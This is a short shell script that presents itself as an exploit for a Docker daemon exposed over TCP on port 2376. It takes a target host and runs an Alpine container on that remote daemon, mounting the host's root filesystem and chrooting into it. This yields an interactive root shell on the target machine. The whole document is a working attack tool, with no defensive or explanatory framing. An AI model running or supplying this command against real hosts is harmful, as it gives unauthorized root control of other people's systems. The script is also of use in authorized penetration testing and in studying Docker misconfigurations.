# Script to exploit the Docker Daemon - Unprotected TCP Socket BUT over TLS (port:2376)


if [ -z "$1" ]
then
        echo "Usage: ./exorcise-tls.sh <TARGET>"
        exit 1
fi

declare domain=$1

echo "Exploiting..."

declare domain=$1

docker -H tcp://${domain}:2376 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
